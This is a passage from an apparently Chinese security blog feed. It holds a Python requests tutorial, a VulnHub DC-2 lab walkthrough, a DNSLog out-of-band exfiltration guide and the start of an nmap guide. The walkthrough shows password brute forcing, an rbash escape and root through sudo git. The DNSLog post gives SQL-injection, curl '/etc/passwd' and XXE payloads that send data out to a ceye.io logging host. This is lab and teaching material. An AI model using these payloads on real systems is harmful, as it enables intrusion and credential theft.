&#x27;value&#x27;)&#125;</span></span><br><span class="line"><span class="comment">#  json=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="响应处理">响应处理</h2><h3 id="响应状态码">响应状态码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status = res.status_code</span><br></pre></td></tr></table></figure><h3 id="响应头信息（键不分大小写）">响应头信息（键不分大小写）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests_header=res.headers[<span class="string">&#x27;content-type&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="响应内容">响应内容</h3><h4 id="字节格式查看内容">字节格式查看内容</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = res.content</span><br><span class="line"><span class="comment"># b&#x27;&#123;\n  &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;,\n  &quot;cur</span></span><br></pre></td></tr></table></figure><h4 id="字符串格式查看内容（序列化JSON）">字符串格式查看内容（序列化JSON）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">因为对 <span class="built_in">bytes</span> 解码到 <span class="built_in">str</span> 需要一个编码格式，所以如果你没有指定，请求将尝试根据响应头来猜测编码格式</span><br><span class="line">res.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"></span><br><span class="line">data=res.text</span><br><span class="line"><span class="comment"># &#123;&quot;current_user_url&quot;:&quot;https://api.github.com/user&quot;,&quot;cur</span></span><br></pre></td></tr></table></figure><h4 id="字典形式内容（反序列化JSON）">字典形式内容（反序列化JSON）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data=res.json()</span><br><span class="line"><span class="comment"># &#123;&#x27;current_user_url&#x27;: &#x27;https://api.github.com/user&#x27;, &#x27;curin</span></span><br><span class="line">提取内容</span><br><span class="line">repository = data[<span class="string">&#x27;items&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">也可以使用 .text 获取 <span class="built_in">str</span> 并使用json.loads() 对其进行反序列化</span><br><span class="line">json.loads(data)</span><br></pre></td></tr></table></figure><h2 id="其他">其他</h2><h3 id="检查请求">检查请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">requests 库会在将请求实际发送到目标服务器之前准备该请求。 请求准备包括像验证头信息和序列化JSON内容等</span><br><span class="line">response.request.headers[<span class="string">&#x27;Content-Type&#x27;</span>]</span><br><span class="line">response.request.url</span><br><span class="line">response.request.body</span><br></pre></td></tr></table></figure><h3 id="身份验证">身份验证</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">使用auth 参数，rqeuests 将使用HTTP的基本访问认证方案来应用凭据</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>, auth=(<span class="string">&#x27;username&#x27;</span>, getpass()))</span><br><span class="line">成功返回&lt;Response [<span class="number">200</span>]&gt;，失败返回&lt;Response [<span class="number">401</span>]&gt;</span><br><span class="line"></span><br><span class="line">HTTPBasicAuth效果同上</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>, auth=HTTPBasicAuth(<span class="string">&#x27;username&#x27;</span>, getpass()))</span><br><span class="line"></span><br><span class="line">requests 也提供了其他身份验证方法，例如 HTTPDigestAuth 和 HTTPProxyAuth</span><br></pre></td></tr></table></figure><h3 id="关闭SSL证书验证">关闭SSL证书验证</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h2 id="性能">性能</h2><h3 id="超时">超时</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">还可以将元组传递给 timeout，第一个元素是连接超时（它允许客户端与服务器建立连接的时间），第二个元素是读取超时（一旦你的客户已建立连接而等待响应的时间）</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=(<span class="number">2</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">超时异常</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> Timeout</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> Timeout:</span><br><span class="line">    print(<span class="string">&#x27;The request timed out&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;The request did not time out&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Session对象">Session对象</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Session 用于跨请求保留参数。 例如，如果要跨多个请求使用相同的身份验证,当你的应用程序想要再次连接到同一服务器时，它将重用池中的连接而不是建立新连接。</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">    session.auth = (<span class="string">&#x27;username&#x27;</span>, getpass())</span><br><span class="line">    response = session.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="最大重试">最大重试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">通过 Transport Adapters，你可以为每个与之交互的服务定义一组配置。 例如，假设你希望所有对于https://api.github.com的请求在最终抛出 ConnectionError 之前重试三次。 你将构建一个 Transport Adapter，设置其 max_retries 参数，并将其装载到现有的 Session</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError</span><br><span class="line"></span><br><span class="line">github_adapter = HTTPAdapter(max_retries=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use `github_adapter` for all requests to endpoints that start with this URL</span></span><br><span class="line">session.mount(<span class="string">&#x27;https://api.github.com&#x27;</span>, github_adapter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    session.get(<span class="string">&#x27;https://api.github.com&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> ConnectionError <span class="keyword">as</span> ce:</span><br><span class="line">    print(ce)</span><br></pre></td></tr></table></figure><h2 id="结尾">结尾</h2><blockquote><blockquote><p>re库参考：<a href="https://juejin.im/post/5d8c630e51882511f444f65b">https://juejin.im/post/5d8c630e51882511f444f65b</a></p></blockquote></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;构造请求&quot;&gt;构造请求&lt;/h2&gt;
&lt;h3 id=&quot;请求头&quot;&gt;请求头&lt;/h3&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span
      
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python库" scheme="http://yoursite.com/tags/python%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub渗透之DC-2</title>
    <link href="http://yoursite.com/2020/07/08/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-2/"/>
    <id>http://yoursite.com/2020/07/08/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-2/</id>
    <published>2020-07-08T11:34:52.000Z</published>
    <updated>2020-07-08T11:34:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0×00-说明">0×00 说明</h2><p><strong>知识点：WordPress、受限shell、git提权</strong></p><blockquote><p>kali：192.168.101.10<br>靶机和kali处于同一局域网</p></blockquote><h2 id="0x01-信息收集">0x01 信息收集</h2><ol><li>探测目标地址</li></ol><p>命令：<code>arp-scan -l</code> 或者 <code>nmap -sP 192.168.101.0/24</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708153613.png" alt=""></p><p>靶机地址为192.168.101.17</p><ol start="2"><li>探测目标开放端口</li></ol><p>命令：<code>nmap -sV -p- 192.168.101.17</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154210.png" alt=""></p><p>靶机开放了80端口和7744端口，7744为SSH，先访问下80</p><blockquote><p>ts：需要先修改hosts文件，kali上的hosts位置在 /etc/hosts</p></blockquote><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154819.png" alt=""></p><h2 id="0x02-Flag1">0x02 Flag1</h2><p>访问成功，使用wappalyzer查看下网站所使用的技术</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708155044.png" alt=""></p><p>网站为 WordPress CMS构建，并且发现第一个flag</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154934.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line"></span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure><p>提示使用cewl工具，并且只有登陆之后才能看到下一个flag</p><h2 id="0x03-Flag2">0x03 Flag2</h2><p>cewl工具可以根据url来生成对应的密码字典<br>命令：<code>cewl -w /root/dic/dc2_passwd.txt http://dc-2/</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708161432.png" alt=""></p><p>有了密码，接下来使用wpscan，它可以查询出wordpress的用户名，-e u是枚举用户名，默认从1-10<br>命令：<code>wpscan --url http://dc-2/ -e u</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708161924.png" alt=""></p><p>接下来，找出 WordPress 登陆地址，可以网上查找或者工具去扫描<br>工具可以用dirb，命令：<code>dirb http://dc-2/</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708162403.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708165933.png" alt=""></p><p>字典地址都具备了，使用wpscan进行爆破<br>命令：<code>wpscan --url http://dc-2/wp-admin -U /root/dic/dc2_username.txt -P /root/dic/dc2_passwd.txt</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708171549.png" alt=""></p><p>爆破成功，结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br></pre></td></tr></table></figure><p>使用 jerry 登陆，找到了flag2</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708171905.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#39;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure><p>意思是，WordPress行不通就换个方式</p><h2 id="0x04-Flag3">0x04 Flag3</h2><p>于是想到之前还有个SSH服务，便尝试登陆，发现jerry无法登录，tom可以</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172252.png" alt=""><br><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172433.png" alt=""></p><p><code>ls</code> 发现 <code>flag3.txt</code> 在当前目录下，但是使用 <code>cat</code> 却提示 <code>-rbash: cat: command not found</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172620.png" alt=""></p><p>这是一个受限shell环境，常见的受限shell环境类型包括rbash、rksh和rsh，于是现在需要绕过rbash，<code>compgen</code>还能使用，查看下当前可以执行的命令<br>命令：<code>compgen -c</code></p><blockquote><p>受限shell是LinuxShell限制一些bash shell中的功能，并且是从名字上很清楚。 该限制很好地实现&gt; 了命令以及脚本在受限shell中运行。 它为Linux中的bash shell提供了一个额外的安全层。</p></blockquote><p>大概清楚了，查看当前环境变量：<code>echo $PATH</code>，发现位于<code>/home/tom/usr/bin</code>下，用<code>vi</code>转义受限制的shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>然后设置环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:$PATH</span><br><span class="line">export SHELL&#x3D;&#x2F;bin&#x2F;bash:$SHELL</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708173847.png" alt=""></p><p>成功绕过rbash，并读取了flag3.txt的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure><p>实际上，是要让我们切换 jerry 用户</p><h2 id="0x05-Flag4">0x05 Flag4</h2><p>使用<code>su jerry</code>切换 jerry 用户，回到jerry的家目录查看，发现了flag4</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708174603.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you&#39;ve made it this far - but you&#39;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#39;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure><p>告诉我们只差最后一个flag了，还提示了 <code>git</code></p><h2 id="0x06-Flag5">0x06 Flag5</h2><p>其实是使用<code>git</code>进行提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708175605.png" alt=""></p><p>拿到最后的 flag .</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0×00-说明&quot;&gt;0×00 说明&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;知识点：WordPress、受限shell、git提权&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;kali：192.168.101.10&lt;br&gt;
靶机和kali处于同一局域网&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="VulnHub" scheme="http://yoursite.com/tags/VulnHub/"/>
    
  </entry>
  
  <entry>
    <title>通过DNSLog获取无回显信息</title>
    <link href="http://yoursite.com/2020/07/04/DNSLog/"/>
    <id>http://yoursite.com/2020/07/04/DNSLog/</id>
    <published>2020-07-04T13:32:36.000Z</published>
    <updated>2020-07-04T13:32:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-原理">0x01 原理</h2><blockquote><p>NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析<br>DNS：域名解析服务器<br>A记录：指定域名对应的IP地址</p></blockquote><p><strong>一句话归纳</strong>😪😪：<br>　　<font color=blue>将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。</font></p><ul><li>案例解释</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping &#96;whoami&#96;.test.com&#x2F;&#x2F;发出请求</span><br><span class="line">ping root.test.com&#x2F;&#x2F;实际请求</span><br></pre></td></tr></table></figure><p><code>whoami</code>在命令行中就自动解析了，所以其实是向<code>root.test.com</code>发出的请求，这时就会被DNS服务器所捕获，我们就能从日志中获取命令执行后的结果了。那到底怎么利用DNSLog进行注入呢？其实只要是能够发出请求的地方都可以用这种方式获取数据。</p><h2 id="0x02-DNSLog平台">0x02 DNSLog平台</h2><p>一、在线平台：<code>http://ceye.io</code>、<code>http://www.dnslog.cn</code></p><p>二、自己搭建DNSLog服务器：<code>https://github.com/BugScanTeam/DNSLog</code></p><p>三、 BurpSuite collaborator</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105715.png" alt=""><br><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105732.png" alt=""></p><p>点击Copy to Clipboard获取一个标识<br>比如我这里获取到的就是<code>s6z9p5lykbxh0m8wx3vy44qg278xwm.burpcollaborator.net</code><br>然后用这个外带就行了</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105806.png" alt=""></p><h2 id="0x03-DNSLog常用场景">0x03 DNSLog常用场景</h2><ol><li>SQL盲注</li><li>命令执行（无回显）</li><li>XSS（无回显）</li><li>SSRF(无回显)</li></ol><h3 id="SQL盲注">SQL盲注</h3><p>以MySQL为例，在MySQL中有个一个<font color=blue>load_file</font>函数可以用来读取本地的文件。前提是root权限。<br>show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p><ul><li>当secure_file_priv为空，就可以读取磁盘的目录。</li><li>当secure_file_priv为E:\，就可以读取E盘的文件。</li><li>当secure_file_priv为null，load_file就不能加载文件。</li></ul><p>⚠️ 注意：load_file函数在<font color=red>Linux</font>下是无法用来做dnslog攻击的，因为在这里就涉及到Windows——<font color=blue>UNC</font>路径。</p><blockquote><p>UNC路径：UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p></blockquote><p>平常在Widnows中用共享文件的时候就会用到这种网络地址的形式：<code>\\sss.xxx\test\</code><br>这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p><p>⚠️ 如果查询的数据中出现了非字母数字的特殊字符，需要进行<font color=blue>转义</font>，这里用16进制。原因是如果出现如逗号，@符号等特殊符号，不能形成标准的dns域名，无法发出数据。</p><ul><li>几个例子</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">直接读取</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">hex转码</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(user())),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">取数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(concat(username,0x7e,password,0x7e)) from security.users limit 0,1),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br></pre></td></tr></table></figure><h3 id="命令执行">命令执行</h3><h4 id="Windows下">Windows下</h4><p>查看计算机名，其他类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %COMPUTERNAME%.xxx.ceye.io</span><br></pre></td></tr></table></figure><h4 id="Linux下">Linux下</h4><p>查看当前用户和passwd文件，其他类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;&#96;whoami&#96;</span><br><span class="line">curl http:&#x2F;&#x2F;ip.port.xxoo.ceye.io&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96;</span><br></pre></td></tr></table></figure><h3 id="XSS">XSS</h3><p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxxx.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure><h3 id="SSRF">SSRF</h3><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;aa&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure><h2 id="0x04-总结">0x04 总结</h2><ul><li>有些函数的使用具有操作系统的限制。</li><li>DNS查询有长度限制，所以必要的时候需要对查询结果做字符串的切割。</li><li>避免一些特殊符号的产生，最好的选择就是数据先编码再带出。</li><li>注意不同数据库的语法是有差异的，特别是在数据库拼接的时候。</li><li>有些操作是需要较高的权限。</li></ul><p>🌈🌈 利用DNSLog攻击的方法，能更加简便、高效的进行渗透测试，并且拥有足够权限，可以直接拿下目标站点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-原理&quot;&gt;0x01 原理&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析&lt;br&gt;
DNS：域名解析服务器&lt;br&gt;
A记录：指定域名对应的IP地址&lt;/p&gt;
&lt;/bloc
      
    
    </summary>
    
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="技巧" scheme="http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>NMAP的使用</title>
    <link href="http://yoursite.com/2020/06/27/Nmap%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2020/06/27/Nmap%E4%BD%BF%E7%94%A8/</id>
    <published>2020-06-27T06:53:22.000Z</published>
    <updated>2020-06-27T06:53:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="namp端口状态">namp端口状态</h2><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Open</span>(开放的): 应用程序正在这个端口上监听连接。</span><br><span class="line"><span class="selector-tag">losed</span>(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。</span><br><span class="line"><span class="selector-tag">Filtered</span>(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。</span><br><span class="line"><span class="selector-tag">Unfiltered</span>(未被过滤的):端口对探测做出了响应，但是<span class="selector-tag">Nmap</span>无法确定它们是关闭还是开放。</span><br><span class="line"><span class="selector-tag">Open</span>/<span class="selector-tag">Filtered</span>: 端口被过滤或者是开放的，<span class="selector-tag">Nmap</span>无法做出判断。</span><br><span class="line"><span class="selector-tag">Closed</span>/<span class="selector-tag">Filtered</span>: 端口被过滤或者是关闭的，<span class="selector-tag">Nmap</span>无法做出判断。</span><br></pre></td></tr></table></figure><h2 id="TCP标志位">TCP标志位</h2><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">SYN</span>(synchronous建立联机)</span><br><span class="line"><span class="selector-tag">ACK</span>(acknowledgement 确认)</span><br><span class="line"><span class="selector-tag">PSH</span>(push传送)</span><br><span class="line"><span class="selector-tag">FIN</span>(finish结束)</span><br><span class="line"><span class="selector-tag">RST</span>(reset重置)</span><br><span class="line"><span class="selector-tag">URG</span>(urgent紧急)</span><br></pre></td></tr></table></figure><h2 id="nmap常用命令">nmap常用命令</h2><p>轻量级扫描：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sP</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.0</span>/<span class="selector-tag">24</span> 判断哪些主机存活</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.3</span> 开放了哪些端口</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.127</span> 开放了哪些端口（隐蔽扫描）</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sU</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.127</span> 开放了哪些端口（<span class="selector-tag">UDP</span>）</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> <span class="selector-tag">-O</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.127</span> 操作系统识别</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-p</span> <span class="selector-tag">80</span> 